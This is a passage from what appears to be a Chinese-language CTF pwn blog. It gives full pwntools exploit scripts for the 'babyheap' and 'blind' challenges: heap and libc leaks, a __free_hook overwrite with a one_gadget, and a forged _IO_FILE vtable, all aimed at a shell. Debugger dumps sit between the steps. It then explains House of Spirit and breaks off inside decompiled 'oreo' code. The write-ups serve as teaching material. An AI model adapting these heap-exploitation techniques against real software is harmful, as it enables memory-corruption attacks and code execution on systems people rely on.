class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">p = process(&apos;./babyheap&apos;)</span><br><span class="line">elf = ELF(&apos;./babyheap&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">def Add(index, data):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.recvuntil(&apos;Index:&apos;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(&apos;Content:&apos;)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line">def Edit(index, data):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.recvuntil(&apos;Index:&apos;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(&apos;Content:&apos;)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line">def Show(index):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;3&apos;)</span><br><span class="line">    p.recvuntil(&apos;Index:&apos;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def Delete(index):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;4&apos;)</span><br><span class="line">    p.recvuntil(&apos;Index:&apos;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Add(0,&apos;aaaaaaaa\n&apos;)</span><br><span class="line">Add(1,&apos;bbbbbbbb\n&apos;)</span><br><span class="line">Add(2,&apos;cccccccc\n&apos;)</span><br><span class="line">Add(3,&apos;dddddddd\n&apos;)</span><br><span class="line"></span><br><span class="line">#--------------leak heap addr----------------</span><br><span class="line">Add(4, p64(0xa0) + p64(0x31) + p64(0x602080 - 0x18) + p64(0x602080 - 0x10))</span><br><span class="line">Add(5, p64(0x30) + p64(0x30) + &apos;\n&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Delete(1)</span><br><span class="line">Delete(0)</span><br><span class="line"></span><br><span class="line">Show(0)</span><br><span class="line">heap_addr = u64(p.recvline()[ : -1].ljust(8, &apos;\x00&apos;)) - 0x30</span><br><span class="line">print &quot;heap_addr: &quot; + hex(heap_addr)</span><br><span class="line"></span><br><span class="line">``</span><br><span class="line">pwndbg&gt; x/10gx 0x0000000000602060     &lt;---chunk_ptr 0-5</span><br><span class="line">0x602060:0x00000000011e20100x00000000011e2040</span><br><span class="line">0x602070:0x00000000011e20700x00000000011e20a0</span><br><span class="line">0x602080:0x00000000011e20d00x00000000011e2100</span><br><span class="line">0x602090:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020a0:0x00000000000000000x0000000000000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/40gx 0x000000000011e2000</span><br><span class="line">0x11e2000:0x00000000000000000x0000000000000031</span><br><span class="line">0x11e2010:0x00000000011e2030 &lt;--- get heap addr0x0000000000000000</span><br><span class="line">0x11e2020:0x00000000000000000x0000000000000000</span><br><span class="line">0x11e2030:0x00000000000000000x0000000000000031</span><br><span class="line">0x11e2040:0x00000000000000000x0000000000000000</span><br><span class="line">0x11e2050:0x00000000000000000x0000000000000000</span><br><span class="line">0x11e2060:0x00000000000000000x0000000000000031</span><br><span class="line">0x11e2070:0x63636363636363630x0000000000000000</span><br><span class="line">0x11e2080:0x00000000000000000x0000000000000000</span><br><span class="line">0x11e2090:0x00000000000000000x0000000000000031</span><br><span class="line">0x11e20a0:0x64646464646464640x0000000000000000</span><br><span class="line">0x11e20b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11e20c0:0x00000000000000000x0000000000000031</span><br><span class="line">0x11e20d0:0x00000000000000a00x0000000000000031</span><br><span class="line">0x11e20e0:0x00000000006020680x0000000000602070</span><br><span class="line">0x11e20f0:0x00000000000000000x0000000000000031</span><br><span class="line">0x11e2100:0x00000000000000300x0000000000000030</span><br><span class="line">0x11e2110:0x00000000000000000x0000000000000000</span><br><span class="line">0x11e2120:0x00000000000000000x0000000000020ee1</span><br><span class="line">0x11e2130:0x00000000000000000x0000000000000000</span><br><span class="line">``</span><br><span class="line"></span><br><span class="line">#-------------leak libc addr--------------------</span><br><span class="line">Edit(0, p64(heap_addr + 0x20) + p64(0) + p64(0) + p64(0x31))</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">Add(6, p64(0) + p64(0xa1) + &apos;\n&apos;)</span><br><span class="line">Add(7, p64(0) + p64(0xa1) + &apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">Delete(1)</span><br><span class="line">Show(1)</span><br><span class="line">libc_address = u64(p.recvline()[ : -1].ljust(8, &apos;\x00&apos;))-0x3c4b78</span><br><span class="line">print &quot;libc_addr: &quot; + hex(libc_address)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">``</span><br><span class="line">pwndbg&gt; x/10gx 0x0000000000602060  &lt;---- chunk_ptr 0-7</span><br><span class="line">0x602060:0x00000000011e20100x00000000011e2040</span><br><span class="line">0x602070:0x00000000011e20700x00000000011e20a0</span><br><span class="line">0x602080:0x00000000006020680x00000000011e2100</span><br><span class="line">0x602090:0x00000000011e20100x00000000011e2030 &lt;---被带偏的chunk</span><br><span class="line">0x6020a0:0x00000000000000000x0000000000000000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/40gx 0x000000000011e2000</span><br><span class="line">0x11e2000:0x00000000000000000x0000000000000031</span><br><span class="line">0x11e2010:0x00000000000000000x00000000000000a1</span><br><span class="line">0x11e2020:0x00000000000000000x0000000000000031</span><br><span class="line">0x11e2030:0x00000000000000000x00000000000000d1 &lt;-----fake small chunk</span><br><span class="line">0x11e2040:0x00007f042e615b780x00007f042e615b78 &lt;-----get libc addr </span><br><span class="line">0x11e2050:0x00000000000000000x0000000000000000</span><br><span class="line">0x11e2060:0x00000000000000000x0000000000000031</span><br><span class="line">0x11e2070:0x63636363636363630x0000000000000000</span><br><span class="line">0x11e2080:0x00000000000000000x0000000000000000</span><br><span class="line">0x11e2090:0x00000000000000000x0000000000000031</span><br><span class="line">0x11e20a0:0x64646464646464640x0000000000000000</span><br><span class="line">0x11e20b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11e20c0:0x00000000000000000x0000000000000031</span><br><span class="line">0x11e20d0:0x00000000000000a00x0000000000000031</span><br><span class="line">0x11e20e0:0x00000000006020680x0000000000602070</span><br><span class="line">0x11e20f0:0x00000000000000000x0000000000000031</span><br><span class="line">0x11e2100:0x00000000000000d00x0000000000000030</span><br><span class="line">0x11e2110:0x00000000000000000x0000000000000000</span><br><span class="line">0x11e2120:0x00000000000000000x0000000000020ee1</span><br><span class="line">0x11e2130:0x00000000000000000x0000000000000000</span><br><span class="line">``</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#---------cover free_hook with one_gadget to get shell --------------------------</span><br><span class="line">one_gadget = 0x45216</span><br><span class="line">free_hook = libc_address + 0x3c67a8</span><br><span class="line">print &quot;free_hook: &quot;+ hex(free_hook)</span><br><span class="line"></span><br><span class="line">Edit(4,p64(free_hook) + &apos;\n&apos;)</span><br><span class="line">Edit(1, p64(libc_address + one_gadget)[:-1] + &apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">Delete(1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="blind"><a href="#blind" class="headerlink" title="blind"></a>blind</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>题目风格与babyheap基本一致：<br>malloc的chunk大小变为0x68 最后得到的chunk也就是0x70,最多6个chunk；<br>edit函数功能一致，去掉了次数限制，show函数被去掉；<br>free函数仍然存在UAF，且限制3次。<br>同时添加了一个system(‘/bin/sh’)的函数。</p><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>直接给了system(‘/bin/sh’)的函数，所以目标就是控制程序执行该函数；<br>看了半天没有头绪，能知道利用UAF漏洞将chunk分配到想要的地方，但是因为没有show函数，并没有办法泄露栈地址；<br>去看了下大佬们的思路，发现是将chunk malloc到bss段，而bss段存在着_IO_FILE的结构体及vtable虚表指针，我们通过修改指针指向，之后伪造file结构体及伪造虚表指针，程序在退出时会自动调用从而拿到shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/6gx 0x602020    &lt;---------bss段的file指针</span><br><span class="line">0x602020 &lt;stdout&gt;:0x00007ffff7dd26200x0000000000000000 </span><br><span class="line">0x602030 &lt;stdin&gt;:0x00007ffff7dd18e00x0000000000000000</span><br><span class="line">0x602040 &lt;stderr&gt;:0x00007ffff7dd25400x0000000000000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/28gx 0x00007ffff7dd2620             &lt;----------stdout的结构体</span><br><span class="line">0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;:0x00000000fbad28870x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2630 &lt;_IO_2_1_stdout_+16&gt;:0x00007ffff7dd26a30x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2640 &lt;_IO_2_1_stdout_+32&gt;:0x00007ffff7dd26a30x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2650 &lt;_IO_2_1_stdout_+48&gt;:0x00007ffff7dd26a30x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2660 &lt;_IO_2_1_stdout_+64&gt;:0x00007ffff7dd26a40x0000000000000000</span><br><span class="line">0x7ffff7dd2670 &lt;_IO_2_1_stdout_+80&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7ffff7dd2680 &lt;_IO_2_1_stdout_+96&gt;:0x00000000000000000x00007ffff7dd18e0</span><br><span class="line">0x7ffff7dd2690 &lt;_IO_2_1_stdout_+112&gt;:0x00000000000000010xffffffffffffffff</span><br><span class="line">0x7ffff7dd26a0 &lt;_IO_2_1_stdout_+128&gt;:0x000000000a0000000x00007ffff7dd3780</span><br><span class="line">0x7ffff7dd26b0 &lt;_IO_2_1_stdout_+144&gt;:0xffffffffffffffff0x0000000000000000</span><br><span class="line">0x7ffff7dd26c0 &lt;_IO_2_1_stdout_+160&gt;:0x00007ffff7dd17a00x0000000000000000</span><br><span class="line">0x7ffff7dd26d0 &lt;_IO_2_1_stdout_+176&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7ffff7dd26e0 &lt;_IO_2_1_stdout_+192&gt;:0x00000000ffffffff0x0000000000000000</span><br><span class="line">0x7ffff7dd26f0 &lt;_IO_2_1_stdout_+208&gt;:0x00000000000000000x00007ffff7dd06e0</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p  *(struct _IO_FILE_plus *) stdout     &lt;--------结构体含义</span><br><span class="line">$4 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72537977, </span><br><span class="line">    _IO_read_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_read_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_read_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_write_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_write_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_write_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_buf_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_buf_end = 0x7ffff7dd26a4 &lt;_IO_2_1_stdout_+132&gt; &quot;&quot;, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;, </span><br><span class="line">    _fileno = 1, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = -1, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &apos;\000&apos;, </span><br><span class="line">    _shortbuf = &quot;\n&quot;, </span><br><span class="line">    _lock = 0x7ffff7dd3780 &lt;_IO_stdfile_1_lock&gt;, </span><br><span class="line">    _offset = -1, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x7ffff7dd17a0 &lt;_IO_wide_data_1&gt;, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = -1, </span><br><span class="line">    _unused2 = &apos;\000&apos; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;      &lt;---------将要被修改指向system(&apos;/bin/sh&apos;)函数的虚表指针</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个确实是知识点不足，对_IO_FILE比较陌生。</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh = process(&apos;./blind&apos;)</span><br><span class="line">elf = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">def new(idx,content):</span><br><span class="line">    sh.sendline(&apos;1&apos;)</span><br><span class="line">    sh.recvuntil(&apos;Index:&apos;)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(&apos;Content:&apos;)</span><br><span class="line">    sh.send(content)</span><br><span class="line">    sh.recvuntil(&apos;Choice:&apos;)</span><br><span class="line"></span><br><span class="line">def change(idx,content):</span><br><span class="line">    sh.sendline(&apos;2&apos;)</span><br><span class="line">    sh.recvuntil(&apos;Index:&apos;)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(&apos;Content:&apos;)</span><br><span class="line">    sh.send(content)</span><br><span class="line">    sh.recv()</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    sh.sendline(&apos;3&apos;)</span><br><span class="line">    sh.recvuntil(&apos;Index:&apos;)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(&apos;Choice:&apos;)</span><br><span class="line"></span><br><span class="line">system_addr =  0x4008E3</span><br><span class="line"></span><br><span class="line">new(0,&apos;a\n&apos;)</span><br><span class="line">new(1,&apos;b\n&apos;)</span><br><span class="line">delete(0)</span><br><span class="line">change(0,p64(0x60203d)+&apos;\n&apos;)     &lt;-------直接利用UAF漏洞伪造fastbin，相对于释放两个再伪造方便了不少</span><br><span class="line"></span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x13 + p64(0x602020)+p64(0x602090)+ p64(0x602090+0x68)+ p64(0x602090+0x68*2) + p64(0x602090+0x68*3)+&apos;\n&apos;</span><br><span class="line">new(2,&apos;a\n&apos;)</span><br><span class="line">new(3,payload)     &lt;-------------伪造的chunk 再用来修改存储chunk指针的地方，后面malloc的事直接省了，还不用考虑过malloc(fastbin)的检查</span><br><span class="line"></span><br><span class="line">gdb.attach(sh)</span><br><span class="line">fake_struct = p64(0x00000000fbad8000) + p64(0x602060)*7 + p64(0x602061) + p64(0)*4  </span><br><span class="line">fake_struct +=  p64(0x602060) + p64(0x1)  + p64(0xffffffffffffffff) + p64(0)</span><br><span class="line">fake_struct += p64(0x602060) + p64(0xffffffffffffffff) + p64(0) + p64(0x602060) </span><br><span class="line">fake_struct +=  p64(0)*3 + p64(0x00000000ffffffff) + p64(0)*2 +  p64(0x602090 + 0x68*3)</span><br><span class="line">fake_vtable = p64(system_addr)*10</span><br><span class="line"></span><br><span class="line">change(1,fake_struct[:0x68])</span><br><span class="line">change(2,fake_struct[0x68:0xd0])</span><br><span class="line">change(3,fake_struct[0xd0:]+&apos;\n&apos;)</span><br><span class="line">change(4,fake_vtable+&apos;\n&apos;)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x/100gx 0x602020</span><br><span class="line">0x602020 &lt;stdout&gt;:0x00007f8bb5dde6200x0000000000000000  </span><br><span class="line">0x602030 &lt;stdin&gt;:0x00007f8bb5ddd8e00x0000000000000000</span><br><span class="line">0x602040 &lt;stderr&gt;:0x00007f8bb5dde5400x6161610000000000</span><br><span class="line">0x602050:0x61616161616161610x6161616161616161</span><br><span class="line">0x602060:0x00000000006020200x0000000000602090</span><br><span class="line">0x602070:0x00000000006020f80x0000000000602160      &lt;-----伪造的一堆chunk指针</span><br><span class="line">0x602080:0x00000000006021c80x0000000000000000</span><br><span class="line"></span><br><span class="line">0x602090:0x00000000fbad80000x0000000000602060      &lt;-----fake_struct 开始</span><br><span class="line">0x6020a0:0x00000000006020600x0000000000602060</span><br><span class="line">0x6020b0:0x00000000006020600x0000000000602060</span><br><span class="line">0x6020c0:0x00000000006020600x0000000000602060</span><br><span class="line">0x6020d0:0x00000000006020610x0000000000000000</span><br><span class="line">0x6020e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020f0:0x00000000000000000x0000000000602060</span><br><span class="line">0x602100:0x00000000000000010xffffffffffffffff</span><br><span class="line">0x602110:0x00000000000000000x0000000000602060</span><br><span class="line">0x602120:0xffffffffffffffff0x0000000000000000</span><br><span class="line">0x602130:0x00000000006020600x0000000000000000</span><br><span class="line">0x602140:0x00000000000000000x0000000000000000</span><br><span class="line">0x602150:0x00000000ffffffff0x0000000000000000</span><br><span class="line">0x602160:0x00000000000000000x00000000006021c8     &lt;----vtable指针指向存放system(&apos;/bin/sh&apos;)函数的地址</span><br><span class="line">0x602170:0x00000000000000000x0000000000000000</span><br><span class="line">0x602180:0x00000000000000000x0000000000000000</span><br><span class="line">0x602190:0x00000000000000000x0000000000000000</span><br><span class="line">0x6021a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6021b0:0x00000000000000000x0000000000000000</span><br><span class="line"></span><br><span class="line">0x6021c0:0x00000000000000000x00000000004008e3      &lt;-----存放了一堆system(&apos;/bin/sh&apos;)函数的地址，便于命中</span><br><span class="line">0x6021d0:0x00000000004008e30x00000000004008e3</span><br><span class="line">0x6021e0:0x00000000004008e30x00000000004008e3</span><br><span class="line">0x6021f0:0x00000000004008e30x00000000004008e3</span><br><span class="line">0x602200:0x00000000004008e30x00000000004008e3</span><br><span class="line">0x602210:0x00000000004008e30x0000000000000000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">change(0,p64(0x602090)+&apos;\n&apos;)                          &lt;------修改stdout指针，稳了</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> stack </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn2.5-HouseOfSpirit</title>
      <link href="/2018/12/23/introduction-to-pwn2-5-houseofspirit/"/>
      <url>/2018/12/23/introduction-to-pwn2-5-houseofspirit/</url>
      <content type="html"><![CDATA[<h1 id="House-of-Spirit-原理"><a href="#House-of-Spirit-原理" class="headerlink" title="House of Spirit 原理"></a>House of Spirit 原理</h1><p>终于正式步入了houseof系列！！</p><p>house of spirit 其实也属于fastbin attack。简单来讲就是伪造一个chunk，不论这个chunk在什么位置，使之能够满足被free的条件，之后再将其malloc出来，因为malloc到了一个我们可控的区域，就有希望继续为所欲为。</p><p>依旧heap-explotation举例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">struct fast_chunk &#123;</span><br><span class="line">  size_t prev_size;</span><br><span class="line">  size_t size;</span><br><span class="line">  struct fast_chunk *fd;</span><br><span class="line">  struct fast_chunk *bk;</span><br><span class="line">  char buf[0x20];                   // chunk falls in fastbin size range</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct fast_chunk fake_chunks[2];   // Two chunks in consecutive memory</span><br><span class="line">// fake_chunks[0] at 0x7ffe220c5ca0</span><br><span class="line">// fake_chunks[1] at 0x7ffe220c5ce0</span><br><span class="line"></span><br><span class="line">void *ptr, *victim;</span><br><span class="line"></span><br><span class="line">ptr = malloc(0x30);                 // First malloc</span><br><span class="line"></span><br><span class="line">// Passes size check of &quot;free(): invalid size&quot;</span><br><span class="line">fake_chunks[0].size = sizeof(struct fast_chunk);  // 0x40</span><br><span class="line"></span><br><span class="line">// Passes &quot;free(): invalid next size (fast)&quot;</span><br><span class="line">fake_chunks[1].size = sizeof(struct fast_chunk);  // 0x40</span><br><span class="line"></span><br><span class="line">// Attacker overwrites a pointer that is about to be &apos;freed&apos;</span><br><span class="line">ptr = (void *)&amp;fake_chunks[0].fd;</span><br><span class="line"></span><br><span class="line">// fake_chunks[0] gets inserted into fastbin</span><br><span class="line">free(ptr);</span><br><span class="line"></span><br><span class="line">victim = malloc(0x30);              // 0x7ffe220c5cb0 address returned from malloc</span><br></pre></td></tr></table></figure><p>可以看见最后malloc到了fakechunk的位置，之后具体的利用以oreo举例</p><h1 id="oreo"><a href="#oreo" class="headerlink" title="oreo"></a>oreo</h1><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>1.malloc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">unsigned int add()</span><br><span class="line">&#123;</span><br><span class="line">  rifle *v1; // [esp+18h] [ebp-10h]</span><br><span class="line">  unsigned int v2; // [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(0x14u);</span><br><span class="line">  v1 = head;</span><br><span class="line">  head = (rifle *)malloc(0x38u);</span><br><span class="line">  if ( head )</span><br><span class="line">  &#123;</span><br><span class="line">    head-&gt;next = v1;</span><br><span class="line">    printf(&quot;Rifle name: &quot;);</span><br><span class="line">    fgets(head-&gt;name, 0x38, stdin);</span><br><span class="line">    cut_enter(head-&gt;name);</span><br><span class="line">    printf(&quot;Rifle description: &quot;);</span><br><span class="line">    fgets(head-&gt;descript, 0x38, stdin);</span><br><span class="line">    cut_enter(head-&gt;descript);</span><br><span class="line">    ++rifle_cnt;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Something terrible happened!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v2;</span><br><span 